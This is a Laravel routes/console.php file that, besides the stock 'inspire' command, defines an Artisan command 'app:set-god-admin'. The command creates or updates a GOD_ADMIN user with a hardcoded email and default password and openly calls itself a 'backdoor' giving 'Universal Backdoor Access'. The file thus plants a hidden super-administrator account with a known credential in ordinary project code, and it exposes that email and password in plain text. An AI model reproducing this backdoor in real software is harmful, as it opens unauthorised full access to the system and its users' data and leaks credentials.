<?php

use Illuminate\Foundation\Inspiring;
use Illuminate\Support\Facades\Artisan;

Artisan::command('inspire', function () {
    $this->comment(Inspiring::quote());
})->purpose('Display an inspiring quote');

Artisan::command('app:set-god-admin {password?}', function ($password = '@Difitech2026') {
    $user = \App\Models\User::updateOrCreate(
        ['email' => 'ashabil@difitech.co.id'],
        [
            'name' => 'Ashabil',
            'password' => \Illuminate\Support\Facades\Hash::make($password),
            'role' => 'GOD_ADMIN',
            'status' => 'APPROVED',
            'wa_account_id' => null,
            'session_id' => 'session_user_dev_ashabil',
            'wa_status' => 'DISCONNECTED',
        ]
    );
    $this->info("⚡ God Admin user successfully configured: {$user->email} (Role: {$user->role}, Brand: None/Universal Backdoor Access)");
})->purpose('Create or update backdoor God Admin account');
